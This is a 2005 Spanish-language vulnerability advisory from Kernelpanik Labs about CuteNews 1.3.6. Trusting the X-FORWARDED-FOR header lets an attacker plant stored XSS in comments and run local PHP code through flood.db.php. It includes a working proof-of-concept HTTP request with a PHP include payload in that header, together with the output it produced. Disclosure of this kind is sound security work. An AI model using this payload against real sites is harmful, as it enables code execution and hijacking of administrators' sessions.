@@ -1,0 +1,84 @@
+=====================================================
+cutenews 1.3.6: Remote XSS && Local Code Execution
+=====================================================
+FraMe - frame at kernelpanik.org
+http://www.kernelpanik.org
+=====================================================
+
+cutenews es un script ligero para la gestión de contenido
+web, principalmente noticias, y weblogs. Usa como sistema
+de backend MySQL. 
+
+El fallo radica en el uso de las variables X-FORWARDED-FOR y CLIENT-IP
+añadida generalmente por proxys transparente sin ningún
+tipo de filtro intermedio, tomándola por buena en todas
+las situaciones. 
+
+Esto permite, bien inyectar código HTML en el sistema de 
+comentarios, dentro del fichero comments.txt, con el que se podrán 
+llevar a cabo ataques XSS, o si nos encontramos en el mismo host de la
+víctima, caso de multiples virtual hosts aislados mediante el uso de 
+cgi-wrappers, podremos inyectar y ejecutar código PHP desde el fichero 
+flood.db.php con los permisos de la víctima. La inyección remota de 
+código no es posible por el uso de un .htaccess protegiendo el acceso
+desde ip's distintas a 127.0.0.1 para el directorio "./data"
+
+La demostración del concepto se va a hacer sobre ejecución de código 
+local. Un XSS remoto en el sistema de administración de comentarios
+es posible inyectando código jscript en el campo X-FORWARDED-FOR
+que será ejecutado por el cliente web del administrador ante la 
+visita al sistema de administración de noticias/comentarios.
+
+==== Detalles del código
+==== Fichero: ./inc/show.inc.php
+
+//----------------------------------
+// Get the IP
+//----------------------------------
+
+if (getenv("HTTP_CLIENT_IP")) $ip = getenv("HTTP_CLIENT_IP");
+else if(getenv("HTTP_X_FORWARDED_FOR")) $ip = getenv("HTTP_X_FORWARDED_FOR");
+else if(getenv("REMOTE_ADDR")) $ip = getenv("REMOTE_ADDR");
+else $ip = "not detected";
+
+==== Proof of concept: Ejecución de código local
+
+POST http://localhost/cutenews/show_news.php?subaction=showcomments&id=1108372700&archive=&start_from=&ucat= HTTP/1.1
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Accept-Encoding: gzip,deflate
+Accept-Language: en-us,en;q=0.5
+Host: localhost
+Referer: http://localhost/cutenews/show_news.php?subaction=showcomments&id=1108372700&archive=&start_from=&ucat=
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041111 Firefox/1.0
+Content-Length: 124
+Content-Type: application/x-www-form-urlencoded
+Keep-Alive: 300
+X-FORWARDED-FOR: <?include("/proc/cpuinfo");?>
+
+name=proof+of+concept&mail=&comments=proof+of+concept&submit=Add+My+Comment&subaction=addcomment&ucat=&show=&cutepath=/parla
+
+==== Demo: include("/proc/cpuinfo");
+
+frame@hawking$ links -dump http://localhost/cutenews/data/flood.db.php
+
+1108929070|processor : 0 vendor_id : AuthenticAMD cpu family : 6 model : 8
+model name : AMD Athlon(TM) XP 2000+ stepping : 1 cpu MHz : 1666.735 cache
+size : 256 KB fdiv_bug : no hlt_bug : no f00f_bug : no coma_bug : no fpu :
+yes fpu_exception : yes cpuid level : 1 wp : yes flags : fpu vme de pse
+tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 mmx fxsr sse
+syscall mmxext 3dnowext 3dnow bogomips : 3322.67 |1108372700|
+
+==== Línea de publicación
+
+No hay línea de publicación.
+
+==== Nota final
+
+register_globals puesto a "off" no elimina esta vulnerabilidad.
+
+================================
+FraMe - frame at kernelpanik.org
+http://www.kernelpanik.org
+2005 (C) Kernelpanik Labs
+================================
